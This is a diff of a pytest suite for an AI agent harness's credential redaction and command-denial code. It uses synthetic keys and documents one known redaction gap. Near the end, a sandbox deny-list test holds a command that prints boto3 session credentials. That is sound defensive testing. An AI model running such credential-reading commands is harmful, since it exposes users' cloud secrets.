@@ -3,21 +3,27 @@
 from __future__ import annotations
 
 import base64
+import hashlib
 import json
+import logging
+import math
 import os
 import random
+import re
 import string
+import struct
 import sys
-import time
+from collections import Counter
 from pathlib import Path
-from unittest import mock
 
 import pytest
 from oauth_url_corpus import OPERATOR_EXTENSION_OAUTH_URLS
 
-from kiro_crew import security
+from kiro_crew import cron_inflight, security
 from kiro_crew.security import (
     _SECRET_KEY_LEN,
+    _SECRET_MAX_SLASHES,
+    REDACTED_CREDENTIAL_TAG,
     apply_resource_limits,
     audit_bash_command,
     audit_bash_exfiltration,
@@ -27,10 +33,22 @@ from kiro_crew.security import (
     redact_and_truncate,
     redact_credentials,
     redact_exfiltration_urls,
+    sanitized_oauth_endpoint,
     scan_exfiltration_urls,
     scan_history,
     should_record_observe_history,
 )
+
+#: The canonical AWS documentation example secret access key. It CONTAINS
+#: two ``/`` characters, which is what makes it the fixture for the
+#: path-versus-secret boundary: a fix that treated every slash-bearing run
+#: as a path would leak exactly this value.
+_AWS_EXAMPLE_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+#: A second slash-bearing shape, so no claim about slash-bearing keys rests
+#: on one fixture's particular letters.
+_ALT_SLASH_KEY = "Kx3Q51tPusV/D0URlGfMmNbVc7Z8yJhLpQrStUwZ"
+#: The same shape without separators, which the ceiling cannot reach.
+_NO_SLASH_KEY = "Kx3Q51tPusVkD0URlGfMmNbVc7Z8yJhLpQrStUwZ"
 
 
 class TestRedactCredentials:
@@ -63,9 +81,7 @@ class TestRedactCredentials:
         result, _ = redact_credentials(text)
         assert "FwoGZXIvYXdzEBYaDH" not in result
 
-    @pytest.mark.parametrize(
-        "key", ("CODER_AGENT_TOKEN", "CODER_SESSION_TOKEN", "KIRO_API_KEY")
-    )
+    @pytest.mark.parametrize("key", ("CODER_AGENT_TOKEN", "CODER_SESSION_TOKEN", "KIRO_API_KEY"))
     def test_redacts_session_host_credentials_by_environment_key(self, key: str) -> None:
         token = "fake-session-credential-without-a-distinctive-prefix"
         text = f'{{"{key}":"{token}"}}'
@@ -290,7 +306,7 @@ class TestRedactCredentials:
     def test_warning_does_not_leak_secret_prefix(self, secret: str) -> None:
         """The warnings list must carry NO secret bytes — only length metadata.
 
-        Regression for the pentest finding: the plaintext branch previously
+        The bug this guards: the plaintext branch
         emitted ``matched[:20]``, leaking a 12-16 char slice of the real secret
         (a fingerprint of exactly which key matched) into a list that sinks
         expect to be safe to log/surface. High-entropy API-key prefixes
@@ -318,6 +334,53 @@ class TestRedactCredentials:
         # host after @ may remain — only the credential prefix is redacted
         assert "[REDACTED: credential]" in result
 
+    def test_every_redaction_tag_constant_is_registered(self) -> None:
+        """A new credential tag must be added to ``CREDENTIAL_REDACTION_TAGS``.
+
+        Consumers ask that tuple "did the redactor replace something here" -- the
+        dashboard chat notice counts it to tell the user their text
+        was rewritten. A tag that exists but is not registered is invisible to
+        every such consumer, which is exactly how the encoded-credential tag came
+        to be missed. This ratchet makes that omission fail here instead of
+        silently degrading a user-facing warning.
+        """
+        from kiro_crew import security
+
+        declared = {
+            name: value
+            for name, value in vars(security).items()
+            if name.startswith("_REDACTED_") and name.endswith("_TAG")
+            if isinstance(value, str)
+        }
+        assert declared, "tag-constant naming changed; this ratchet no longer sees them"
+
+        unregistered = {
+            name: value
+            for name, value in declared.items()
+            if value not in security.CREDENTIAL_REDACTION_TAGS
+        }
+        assert not unregistered, (
+            "redaction tag(s) not in CREDENTIAL_REDACTION_TAGS: "
+            f"{sorted(unregistered)} -- add them there so consumers that ask "
+            "'was anything redacted' (e.g. the dashboard chat notice) can see them"
+        )
+
+    def test_pass_two_emits_a_registered_tag(self) -> None:
+        """The base64 pass must substitute a tag consumers actually look for."""
+        import base64
+
+        from kiro_crew.security import (
+            _REDACTED_ENCODED_CREDENTIAL_TAG,
+            CREDENTIAL_REDACTION_TAGS,
+        )
+
+        blob = base64.b64encode(b"postgresql://user:pass@host:5432/db").decode()
+        result, warnings = redact_credentials(f"blob: {blob}")
+
+        assert _REDACTED_ENCODED_CREDENTIAL_TAG in result
+        assert _REDACTED_ENCODED_CREDENTIAL_TAG in CREDENTIAL_REDACTION_TAGS
+        assert any("base64-encoded" in w for w in warnings)
+
     @pytest.mark.parametrize(
         "mongo",
         [
@@ -325,6 +388,14 @@ class TestRedactCredentials:
             "mongodb+srv://user:pw@cluster0.example.com",
             "mysql://root:toor@localhost:3306/db",
             "redis://default:secret@redis.example.com:6379",
+            # URL userinfo is a credential on fetch schemes too (a
+            # token-bearing artifact CDN base quoted by update-failure text).
+            "https://user:tok-SECRET99@cdn.example.com/w.whl",
+            "ftp://anon:pw@mirror.example.com/f",
+            # A password containing an unencoded @ must redact through the
+            # FINAL authority separator, not stop at the first @.
+            "https://user:p@ss@cdn.example.com/w.whl",
+            "redis://default:se@cret@redis.example.com:6379",
         ],
     )
     def test_redacts_various_db_uris(self, mongo: str) -> None:
@@ -337,6 +408,8 @@ class TestRedactCredentials:
             "npm_config_cache=/home/u/.npm",  # npm_ env var, too short + underscores
             "git sha 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b",  # 40-hex git SHA
             "postgresql://localhost:5432/db",  # no user:pass@
+            "https://example.com:8080/path",  # port is not userinfo
+            "https://example.com/a@b",  # @ in the path, not the authority
             "SG.short.x",  # segments too short
             "the ghp_ prefix on its own",  # no token body
         ]:
@@ -443,8 +516,8 @@ class TestRedactCredentials:
         assert '"region":"x"' in result
 
     # ── JWT / Authorization: Bearer tokens (security-review cc1d6bdd) ──
-    # JWTs and OAuth bearer tokens leaked in tool output / logs were previously
-    # not redacted. `eyJ` is the base64url of every JWT header's `{"` prefix.
+    # JWTs and OAuth bearer tokens can leak in tool output / logs. They are
+    # redacted here. `eyJ` is the base64url of every JWT header's `{"` prefix.
 
     _JWT = (
         "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
@@ -518,7 +591,7 @@ class TestRedactCredentials:
     def test_redacts_json_shaped_authorization_bearer(self) -> None:
         """A serialized JSON header `{"Authorization": "Bearer <tok>"}` redacts.
 
-        security-review round-2 follow-up to the quote before the `:` and
+        The quote before the `:` and
         the quote before the token defeated the old `Authorization:\\s*Bearer`
         prefix, leaking the token in structured logs / JSON request dumps.
         """
@@ -700,9 +773,7 @@ class TestRedactCredentials:
 
         # Derived worst case: the narrowest `sub` a caller could pass, with every
         # float claim at its shortest repr (an exactly-integral `time.time()`).
-        claims = json.loads(
-            base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4))
-        )
+        claims = json.loads(base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4)))
         # `gen` is normalised alongside `sub` because it mirrors the persisted
         # counter behind `revocation_gen.current_revocation_gen()`, LOADED FROM
         # DISK on first use. Left ambient, the
@@ -939,6 +1010,280 @@ class TestBareSecretKeyRedaction:
         assert not warnings
 
 
+class TestPathWindowsAreNotBareSecrets:
+    """A deep CamelCase absolute path must survive ``redact_credentials``.
+
+    ``/`` is in ``_B64_CHUNK_RE``'s character class, so an absolute path built
+    from CamelCase segments is ONE base64-alphabet run -- it breaks only at
+    ``-``, ``_``, ``.`` or whitespace. ``_contains_bare_secret`` slides a 40-char
+    window across it, and a window cut from two or three components defeats the
+    structural gates on their own terms: CamelCase caps the lowercase run,
+    consonant-heavy acronyms crush the vowel ratio, a version digit supplies the
+    third character class, and the separators lift the entropy. One passing window
+    replaced the WHOLE run, so the path came back as the tag and every consumer
+    that dereferences it -- a file-path chip, a screenshot note -- got an unusable
+    string instead of a path.
+
+    ``_SECRET_MAX_SLASHES`` declines such a window, and the two properties that
+    keep it from being a hole are pinned below: every window is still classified,
+    and a run of exactly one key length is never subject to the ceiling.
+    """
+
+    # ── benign paths must survive ──
+
+    @pytest.mark.parametrize(
+        "path",
+        [
+            # The reported shape: consonant-heavy acronyms plus a version digit.
+            "/Volumes/workplace/TRAM/QuickProp2/src/ATVTramQuickPropCDK/lib/config/consumerVpcs.ts",
+            "/Volumes/workplace/CMS/A3P3/src/LPTCoreServiceCDK/lib/stacks/MainStack2.ts",
+            "/opt/workplace/ATVDeviceRegistry2/src/ATVDeviceRegistryCDKv2/lib/Vpcs3.ts",
+            # The macOS per-user temp directory. `computer_use/render.py` documents
+            # this same mechanism destroying every screenshot note on macOS.
+            "/var/folders/6r/qKz9XyT3wLmNp7vB2cQ4hJ8000gn/T/screenshot.png",
+            "/Users/Someone/Projects/DeepCamelCaseFolder/AnotherCamelFolder/SomeComponentName.ts",
+            "/srv/build/src/main/java/com/Example/Service2/FooBarBazClas1/Handler9.java",
+            "/mnt/data/RepoName2/PackageNameCDK/lib/config/RegionConfig3/UsEast1Props.ts",
+            "/srv/app/BuildArtifacts9/SubProjectCore/GeneratedSources2/ModelTypes4.ts",
+            "/private/var/db/CryptexStore2/StagedCryptexes/OsVariant3/PayloadRoot9",
+            "/usr/lib/NodeModules2/SomePackageName/DistBundles3/EsmChunkNames9.mjs",
+            # A '+' in a component is ordinary: the ceiling counts separators, so it
+            # needs no base64-alphabet carve-out.
+            "/usr/include/c++/v1/LongCamelNameHere2/AnotherCamelName3/ThirdName4",
+            # The root name is ordinary too: nothing here consults a list of roots,
+            # so a path under an unusual mount is covered like any other.
+            "/data/scratch/BuildRoot2/SubPackageCore/GeneratedModels3/TypeDefs4.ts",
+            # Relative, and long enough to be one run.
+            "src/main/java/com/Example/Service2/FooBarBazClas1/HandlerImpl9.java",
+        ],
+    )
+    def test_camelcase_path_survives(self, path: str) -> None:
+        result, warnings = redact_credentials(path)
+        assert result == path, f"path over-redacted: {path!r}"
+        assert not warnings
+
+    def test_the_reported_path_is_still_openable(self) -> None:
+        """The end-to-end symptom: the redacted string is what the viewer sends.
+
+        A tag in place of the path is not a display glitch -- it is the value the
+        file-read request carries, so the chip can never resolve. Assert the two
+        properties a consumer needs, not only equality.
+        """
+        path = (
+            "/Volumes/workplace/TRAM/QuickProp2/src/ATVTramQuickPropCDK/lib/config/consumerVpcs.ts"
+        )
+        result, _ = redact_credentials(path)
+        assert REDACTED_CREDENTIAL_TAG not in result
+        assert result.startswith("/") and result.endswith(".ts")
+
+    # ── a standalone key is never subject to the ceiling ──
+
+    # Uniformly random 40-char base64 tokens that the seven gates accept AND that
+    # carry more separators than the ceiling -- the population the ceiling would
+    # cost if it reached a standalone token. They cover 4 to 8 separators,
+    # including a leading one, a trailing one and an adjacent pair.
+    SEPARATOR_HEAVY_KEYS = (
+        "KSd5/MUOI7pQ/+X/lzj0Ma/DwFo5hMVm6ScMCQUs",
+        "dMtmrCnv/fCJ/FcS/N/VWJV/t4OMtde4urD+evIx",
+        "/ybCN+5DAYirSIyzpX/f1cjuq5b/mLA4NxO9/3sH",
+        "EuaHEF+2RGfJHHMc/r6//y7R0zTqsz/9/PZs6zcj",
+        "wu9P3axJ2M/J0fFa/MG/hJ/LP/C7KzMSpSVr5w//",
+        "Zy6//Pgqw1X5bzp55Iv/RvJ/y/KSojZIKIlR/umL",
+    )
+
+    @pytest.mark.parametrize("key", SEPARATOR_HEAVY_KEYS)
+    def test_a_standalone_key_is_redacted_however_many_separators_it_holds(self, key: str) -> None:
+        """The ceiling applies to a FRAGMENT, and a standalone key is not one.
+
+        A genuine AWS secret access key is uniformly random base64, so roughly 1
+        in 200 of them carries four or more separators. Such a key echoed on its
+        own -- in prose, in a JSON array element, after a label, on its own line --
+        is a run of exactly ``_SECRET_KEY_LEN`` chars, which is the token somebody
+        wrote rather than a window cut out of anything. It must redact whatever its
+        separator count, and this is what pins that.
+        """
+        assert len(key) == _SECRET_KEY_LEN
+        assert key.count("/") > _SECRET_MAX_SLASHES, "fixture must exceed the ceiling"
+        assert security._looks_like_secret_key(key), "fixture must be key-shaped"
+        for label, text in (
+            ("standalone", key),
+            ("in prose", f"the key is {key} - keep it safe"),
+            ("in a JSON array", f'{{"keys": ["{key}"]}}'),
+            ("after a label", f"SECRET_ACCESS_KEY={key}"),
+        ):
+            result, _ = redact_credentials(text)
+            assert key not in result, f"{label}: key leaked: {key!r}"
+
+    # ── secrets must still be redacted, in every path context ──
+
+    @pytest.mark.parametrize(
+        "label,text",
+        [
+            ("standalone slash-bearing key", _AWS_EXAMPLE_KEY),
+            ("standalone second slash-bearing key", _ALT_SLASH_KEY),
+            ("standalone slash-free key", _NO_SLASH_KEY),
+            ("key as a path component", f"/srv/ci/keys/{_AWS_EXAMPLE_KEY}"),
+            ("second key as a path component", f"/srv/ci/keys/{_ALT_SLASH_KEY}"),
+            ("slash-free key as a component", f"/srv/ci/keys/{_NO_SLASH_KEY}"),
+            ("key in a URL path", f"https://example.com/v1/data/{_AWS_EXAMPLE_KEY}"),
+            ("key with components after it", f"/srv/ci/keys/dir/{_AWS_EXAMPLE_KEY}/more/here"),
+            ("key glued after a prefix", f"/srv/ci/keys/pfx{_AWS_EXAMPLE_KEY}"),
+            ("key glued before a suffix", f"/srv/ci/keys/{_AWS_EXAMPLE_KEY}sfx"),
+            ("key glued on both sides", f"/srv/ci/keys/X{_AWS_EXAMPLE_KEY}X"),
+            ("key buried in one component", f"/srv/ci/keys/pfx{_NO_SLASH_KEY}sfx"),
+            # A key whose true offset is not where any component begins, and whose
+            # component-start window is a word-shaped prefix plus a partial key.
+            # A gate on the window's own bytes still classifies the key itself.
+            (
+                "key glued after a word-shaped prefix",
+                f"/aa/bb/cc/loremipsumdolorsitam{_AWS_EXAMPLE_KEY}",
+            ),
+            (
+                "second key glued after a word-shaped prefix",
+                f"/aa/bb/cc/loremipsumdolorsitam{_ALT_SLASH_KEY}",
+            ),
+        ],
+    )
+    def test_secret_is_still_redacted(self, label: str, text: str) -> None:
+        result, warnings = redact_credentials(text)
+        assert REDACTED_CREDENTIAL_TAG in result, f"{label}: secret leaked: {text!r}"
+        assert warnings, label
+
+    def test_a_key_at_the_ceiling_is_still_found_inside_a_run(self) -> None:
+        """The ceiling is inclusive: exactly ``_SECRET_MAX_SLASHES`` separators pass.
+
+        A key-shaped window carrying exactly the ceiling's count, glued into a
+        path so the run is a fragment, must still redact. Pins the boundary the
+        residual test above sits one past.
+        """
+        key = "1GQmz9m/Mbpp/8bv4mTvEFNQR/Y8O2C2SSYEDQYD"
+        assert len(key) == _SECRET_KEY_LEN
+        assert key.count("/") == _SECRET_MAX_SLASHES
+        assert security._looks_like_secret_key(key)
+        result, warnings = redact_credentials(f"/srv/ci/keys/{key}")
+        assert REDACTED_CREDENTIAL_TAG in result
+        assert warnings
+
+    # ── the accepted residual, pinned so it is a decision and not a gap ──
+
+    @pytest.mark.parametrize("key", SEPARATOR_HEAVY_KEYS[:2])
+    @pytest.mark.parametrize("enclosing", ["/srv/ci/keys/{}", "https://example.com/v1/{}"])
+    def test_the_accepted_residual_is_a_separator_heavy_key_glued_into_a_run(
+        self, key: str, enclosing: str
+    ) -> None:
+        """DOCUMENTS AN ACCEPTED LOSS. This asserts what is NOT redacted.
+
+        A key carrying more separators than the ceiling AND glued into a longer run
+        is not detected. That is the trade this ceiling makes, and it is asserted
+        here so it is a reviewed decision with a name rather than an untested
+        corner of the credential-redaction guarantee.
+
+        It cannot be closed at this layer. The benign path the ceiling exists to
+        save and the key below are the SAME BYTES to the classifier: both are
+        40-char windows over ``[A-Za-z0-9+/]`` carrying several separators that
+        clear all seven gates, inside a run longer than one key. Any rule reading
+        only the run's bytes that declines the first must decline the second.
+        Distinguishing them needs information the run does not carry -- that the
+        value is a path FIELD -- and ``redact_credentials`` runs over free-form
+        transcript text, which has no such field.
+
+        What bounds the loss is ``is_fragment``: the run must be longer than one
+        whole key, so every shape an accidental echo takes is excluded. The
+        surviving class needs a key that both carries 4+ separators (0.36% of
+        uniformly random keys) and is concatenated to further base64 characters
+        with no delimiter.
+
+        If a future change adds a signal that separates the two, this test is the
+        one to delete -- deliberately, and with the ceiling's rationale reread.
+        """
+        text = enclosing.format(key)
+        assert key.count("/") > _SECRET_MAX_SLASHES
+        assert security._looks_like_secret_key(key), "fixture must be key-shaped"
+        result, warnings = redact_credentials(text)
+        assert result == text
+        assert not warnings
+
+    # ── the two properties that keep the ceiling from being a hole ──
+
+    def test_no_window_of_a_path_run_is_skipped(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        """The ceiling may decline a window; it may not decline to LOOK at one.
+
+        Narrowing which offsets are examined is the other available shape of this
+        fix, and it leaves a key whose true offset is not examined undetected.
+        This counts classifications: every offset of the run must still reach the
+        classifier even though the run is a path and the verdict is False.
+        """
+        run = "/Volumes/workplace/TRAM/QuickProp2/src/ATVTramQuickPropCDK/lib/config/consumerVpcs"
+        seen: list[str] = []
+        real = security._looks_like_secret_key
+
+        def counting(token: str) -> bool:
+            seen.append(token)
+            return real(token)
+
+        monkeypatch.setattr(security, "_looks_like_secret_key", counting)
+        assert security._contains_bare_secret(run) is False
+        assert len(seen) == len(run) - _SECRET_KEY_LEN + 1
+        # And the classifier itself said yes to at least one of them, which is what
+        # makes the ceiling -- rather than some other gate -- the thing that saved
+        # this path.
+        assert any(real(token) for token in seen)
+
+    def test_the_ceiling_is_what_saves_the_reported_path(
+        self, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        """Raise the ceiling and the reported path is swallowed again.
+
+        Asserted directly so the benign-path fixtures above cannot silently stop
+        depending on the ceiling.
+        """
+        path = (
+            "/Volumes/workplace/TRAM/QuickProp2/src/ATVTramQuickPropCDK/lib/config/consumerVpcs.ts"
+        )
+        assert redact_credentials(path)[0] == path
+        monkeypatch.setattr(security, "_SECRET_MAX_SLASHES", _SECRET_KEY_LEN)
+        assert redact_credentials(path)[0] != path
+
+    def test_the_classifier_itself_is_unchanged_by_the_ceiling(self) -> None:
+        """``_looks_like_secret_key`` stays a seven-gate predicate on its token.
+
+        The ceiling lives in the slide, not in the classifier, because it is a
+        statement about a window's relationship to a longer run rather than about
+        the token. A token with many separators is still a secret to the
+        classifier, and that is what lets a standalone key keep redacting.
+        """
+        token = self.SEPARATOR_HEAVY_KEYS[0]
+        assert token.count("/") > _SECRET_MAX_SLASHES
+        assert security._looks_like_secret_key(token) is True
+
+
+class TestSecretSlashCapIsTheKnee:
+    """Pin the ceiling's value against the real classifier, not a re-implementation.
+
+    The two deep paths below are the ones the seven older gates cannot save. The
+    chosen ceiling saves both; one notch looser saves neither. Swapping the
+    constant rather than re-implementing the slide is what makes this a test of
+    the shipped code.
+    """
+
+    PATHS = (
+        "/Volumes/workplace/TRAM/QuickProp2/src/ATVTramQuickPropCDK/lib/config/consumerVpcs",
+        "/var/folders/6r/qKz9XyT3wLmNp7vB2cQ4hJ8000gn/T/screenshot",
+    )
+
+    @pytest.mark.parametrize("path", PATHS)
+    def test_the_chosen_ceiling_saves_the_path(
+        self, path: str, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        monkeypatch.setattr(security, "_SECRET_MAX_SLASHES", _SECRET_MAX_SLASHES)
+        assert security._contains_bare_secret(path) is False
+
+    @pytest.mark.parametrize("path", PATHS)
+    def test_one_notch_looser_does_not(self, path: str, monkeypatch: pytest.MonkeyPatch) -> None:
+        monkeypatch.setattr(security, "_SECRET_MAX_SLASHES", _SECRET_MAX_SLASHES + 1)
+        assert security._contains_bare_secret(path) is True
+
+
 class TestBareSecretRunLevelFastPath:
     """The run-level fast path must be an optimization ONLY, never a hole.
 
@@ -1145,15 +1490,11 @@ class TestSecretGateOrderIsCostOrdered:
         assert counts["entropy"] == 1, f"entropy should be reached: {counts}"
         assert counts["decode"] == 0, f"decode must run after entropy: {counts}"
 
-    def test_a_real_key_still_pays_for_every_gate(
-        self, monkeypatch: pytest.MonkeyPatch
-    ) -> None:
+    def test_a_real_key_still_pays_for_every_gate(self, monkeypatch: pytest.MonkeyPatch) -> None:
         # The pass-through case: a genuine key clears all gates, so every gate
         # runs exactly once. This is what proves the cheap gates are not
         # short-circuiting a real secret away from the expensive checks.
-        counts = self._counting_classify(
-            "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", monkeypatch
-        )
+        counts = self._counting_classify("wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", monkeypatch)
         assert counts == {"entropy": 1, "decode": 1}
 
 
@@ -1201,9 +1542,7 @@ class TestSecretGateOrderIsVerdictNeutral:
             return False
         return (
             security._vowel_ratio(token) <= security._SECRET_MAX_VOWEL_RATIO
-            and not security._lowercase_run_exceeds(
-                token, security._SECRET_MAX_LOWER_RUN
-            )
+            and not security._lowercase_run_exceeds(token, security._SECRET_MAX_LOWER_RUN)
             and security._shannon_entropy(token) >= security._SECRET_ENTROPY_MIN
             and not security._decodes_to_printable_text(token)
         )
@@ -1254,6 +1593,194 @@ class TestSecretGateOrderIsVerdictNeutral:
         assert secret not in result
         assert warnings
         assert "keep this prose" in result
+
+
+class TestShannonEntropyIsBitIdentical:
+    """``_shannon_entropy`` precomputes its terms, and must not move a single bit.
+
+    The value feeds a ``>= _SECRET_ENTROPY_MIN`` comparison in
+    :func:`~kiro_crew.security._looks_like_secret_key`, so it decides whether a
+    token is redacted. That makes ``math.isclose`` the WRONG assertion for this
+    function: a drift small enough to pass a tolerance check is still large
+    enough to flip the comparison for a token sitting on the boundary, and a flip
+    in the permissive direction leaks a credential verbatim. So these tests
+    compare IEEE-754 bit patterns via :func:`struct.pack`, which fails on a
+    one-ULP difference and cannot be satisfied by "close enough".
+
+    :meth:`_oracle` holds the pre-optimisation implementation verbatim. Keeping it
+    here rather than deleting it is the point: the optimisation's whole claim is
+    equality with THAT expression, so the claim needs the expression to still
+    exist somewhere executable.
+    """
+
+    # Character counts of the two 40-char tokens whose entropy sits closest to
+    # 4.3 from either side. Entropy depends only on the MULTISET OF COUNTS, so a
+    # partition of 40 pins the value exactly and any token realising it has that
+    # entropy. Searching every partition of 40 (restricted to at most one
+    # base64-alphabet character each) found these two as the nearest achievable
+    # neighbours of the threshold -- 4.3012... above and 4.2964... below.
+    _NEAREST_ABOVE_COUNTS = (5, 5, 5, 2, 2, 2) + (1,) * 19
+    _NEAREST_BELOW_COUNTS = (3, 3, 3, 3) + (2,) * 11 + (1,) * 6
+
+    _ALPHABET = string.ascii_letters + string.digits + "+/"
+
+    @staticmethod
+    def _oracle(token: str) -> float:
+        """The implementation from before the term table, character for character."""
+        if not token:
+            return 0.0
+        counts = Counter(token)
+        length = len(token)
+        return -sum((c / length) * math.log2(c / length) for c in counts.values())
+
+    @staticmethod
+    def _bits(value: float) -> bytes:
+        """Return *value*'s IEEE-754 bytes, so ``-0.0`` and ``0.0`` differ."""
+        return struct.pack("<d", value)
+
+    @classmethod
+    def _realize(cls, counts: tuple[int, ...], shuffle_seed: int | None = None) -> str:
+        """Build a token whose character counts are exactly *counts*."""
+        chars: list[str] = []
+        for index, count in enumerate(counts):
+            chars.extend(cls._ALPHABET[index] * count)
+        if shuffle_seed is not None:
+            random.Random(shuffle_seed).shuffle(chars)
+        return "".join(chars)
+
+    @classmethod
+    def _corpus(cls) -> list[str]:
+        """Tokens spanning every shape this function is asked about, and then some."""
+        tokens: list[str] = []
+
+        # 1. The gate-order corpus: real keys, JWT segments, paths, identifiers,
+        #    hex digests, prose, base64 blobs -- every 40-char window of each.
+        for source in TestSecretGateOrderIsVerdictNeutral.SOURCES:
+            for i in range(max(1, len(source) - _SECRET_KEY_LEN + 1)):
+                tokens.append(source[i : i + _SECRET_KEY_LEN])
+
+        # 2. Random base64-alphabet windows, the shape a real secret has.
+        rng = random.Random(20260901)
+        tokens += [
+            "".join(rng.choice(cls._ALPHABET) for _ in range(_SECRET_KEY_LEN)) for _ in range(500)
+        ]
+
+        # 3. ADVERSARIAL: the nearest-to-threshold tokens from both sides, each in
+        #    its natural order plus seeded shuffles. The shuffles vary the
+        #    first-occurrence order that drives the summation sequence, so a
+        #    rewrite that canonicalised or sorted the counts would have to survive
+        #    many different orders of the same addends.
+        for counts in (cls._NEAREST_ABOVE_COUNTS, cls._NEAREST_BELOW_COUNTS):
+            tokens.append(cls._realize(counts))
+            tokens += [cls._realize(counts, seed) for seed in range(16)]
+
+        # 4. Degenerate and boundary shapes: empty, single character, all-identical
+        #    (whose entropy is -0.0, a distinct bit pattern from 0.0), two
+        #    characters, the whole alphabet once each, non-ASCII, and an astral
+        #    character whose UTF-16 surrogate pair must not be counted as two.
+        tokens += [
+            "",
+            "a",
+            "a" * _SECRET_KEY_LEN,
+            "ab" * 20,
+            cls._ALPHABET,
+            "h\u00e9llo w\u00f6rld",
+            "\U0001f511" * 8,
+        ]
+
+        # 5. Lengths on both sides of the one length the table covers, so both the
+        #    table path and the inline fallback are exercised.
+        for length in (1, 2, 3, 39, 40, 41, 255, 256, 257, 1024):
+            tokens.append("".join(cls._ALPHABET[i % len(cls._ALPHABET)] for i in range(length)))
+            tokens.append("z" * length)
+
+        return tokens
+
+    def test_every_token_is_bit_identical_to_the_pre_table_implementation(self) -> None:
+        corpus = self._corpus()
+        assert len(corpus) > 500, "corpus collapsed; the rest of this class proves nothing"
+        for token in corpus:
+            got = security._shannon_entropy(token)
+            want = self._oracle(token)
+            assert self._bits(got) == self._bits(want), (
+                f"entropy drifted for {token!r}: got {got!r} "
+                f"({self._bits(got).hex()}) want {want!r} ({self._bits(want).hex()})"
+            )
+
+    def test_no_token_in_the_corpus_changes_side_of_the_redaction_threshold(self) -> None:
+        # Bit-identity implies this, but assert it directly: this is the property
+        # a leak would violate, and it survives a future refactor that relaxes the
+        # bit-level assertion above.
+        for token in self._corpus():
+            new_side = security._shannon_entropy(token) >= security._SECRET_ENTROPY_MIN
+            old_side = self._oracle(token) >= security._SECRET_ENTROPY_MIN
+            assert new_side is old_side, f"redaction verdict flipped for {token!r}"
+
+    def test_the_corpus_straddles_the_threshold_from_both_sides(self) -> None:
+        # A bit-identity test over a corpus that never approaches 4.3 would pass
+        # no matter how the boundary behaved. Prove the corpus bites.
+        values = [security._shannon_entropy(token) for token in self._corpus()]
+        threshold = security._SECRET_ENTROPY_MIN
+        above = [v for v in values if v >= threshold]
+        below = [v for v in values if v < threshold]
+        assert above, "corpus has no token at or above the threshold"
+        assert below, "corpus has no token below the threshold"
+        # And the nearest neighbours really are within a few thousandths of it.
+        # Those two bounds are the MEASURED gaps: no 40-char token can sit closer
+        # to 4.3 than 1.21e-3 above or 3.57e-3 below, because entropy at a fixed
+        # length takes only the discrete values the partitions of that length
+        # allow. Tightening either bound past its gap would assert an input that
+        # does not exist.
+        assert min(above) - threshold < 2e-3, f"closest token above is {min(above)!r}"
+        assert threshold - max(below) < 4e-3, f"closest token below is {max(below)!r}"
+
+    def test_the_nearest_neighbour_tokens_land_on_opposite_sides(self) -> None:
+        threshold = security._SECRET_ENTROPY_MIN
+        above = security._shannon_entropy(self._realize(self._NEAREST_ABOVE_COUNTS))
+        below = security._shannon_entropy(self._realize(self._NEAREST_BELOW_COUNTS))
+        assert above >= threshold, f"expected {above!r} at or above {threshold}"
+        assert below < threshold, f"expected {below!r} below {threshold}"
+
+    def test_the_corpus_exercises_both_the_table_and_the_fallback(self) -> None:
+        # The two code paths must both be reached, or the fallback is untested and
+        # the table branch is a silent behaviour change for every other length.
+        lengths = {len(token) for token in self._corpus()}
+        assert _SECRET_KEY_LEN in lengths, lengths
+        assert any(n != _SECRET_KEY_LEN for n in lengths), lengths
+
+    def test_an_all_identical_token_keeps_its_negative_zero(self) -> None:
+        # Every term is 1.0 * log2(1.0) == 0.0, and negating the sum yields -0.0.
+        # math.isclose and == both treat -0.0 as 0.0, so only the bit pattern can
+        # tell that the sign was preserved.
+        value = security._shannon_entropy("a" * _SECRET_KEY_LEN)
+        assert self._bits(value) == self._bits(-0.0)
+        assert self._bits(value) != self._bits(0.0)
+
+    def test_an_empty_token_is_positive_zero(self) -> None:
+        # The early return is a literal 0.0, not a negated sum, so its sign
+        # differs from the all-identical case above. Pin both.
+        assert self._bits(security._shannon_entropy("")) == self._bits(0.0)
+
+    def test_each_table_entry_equals_the_inline_expression_it_replaced(self) -> None:
+        # The table is only a precomputation if every entry is what the inline
+        # expression would have produced. The table covers exactly one length, so
+        # check it exhaustively.
+        table = security._ENTROPY_TERMS_KEY_LEN
+        assert len(table) == _SECRET_KEY_LEN + 1
+        for count in range(1, _SECRET_KEY_LEN + 1):
+            want = (count / _SECRET_KEY_LEN) * math.log2(count / _SECRET_KEY_LEN)
+            detail = f"term {count} of {_SECRET_KEY_LEN}: {table[count]!r} != {want!r}"
+            assert self._bits(table[count]) == self._bits(want), detail
+
+    def test_the_table_covers_the_only_length_the_gate_can_ask_about(self) -> None:
+        # The table is built for one length rather than parameterised, so that
+        # length must be the one gate 1 admits. If _SECRET_KEY_LEN ever changes
+        # without the table following, every 40-char token would silently take the
+        # inline fallback and the optimisation would be dead code.
+        token = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+        assert len(token) == _SECRET_KEY_LEN
+        assert security._looks_like_secret_key(token)
+        assert self._bits(security._shannon_entropy(token)) == self._bits(self._oracle(token))
 
 
 class TestLowercaseRunExceedsStopsAtTheCap:
@@ -1307,8 +1834,8 @@ class TestLowercaseRunExceedsStopsAtTheCap:
 class TestSandboxDeniedCommands:
     """Verify command denial allows/blocks the right ada and AWS patterns.
 
-    Command denial is no longer injected into the kiro-cli agent spec
-    (``config/defaults.json`` no longer carries ``deniedCommands``); it is
+    Command denial is not injected into the kiro-cli agent spec
+    (``config/defaults.json`` does not carry ``deniedCommands``); it is
     enforced solely at KiroCrew's own ``hooks.py`` PreToolUse gate, whose
     decision function is ``security.is_denied`` (built-in regex tier + the
     always-on keystone controls for exfiltration / sensitive-path reads).  These
@@ -1394,18 +1921,12 @@ class TestSandboxDeniedCommands:
         cmd = "python3 -c 'import boto3; print(boto3.Session().get_credentials())'"
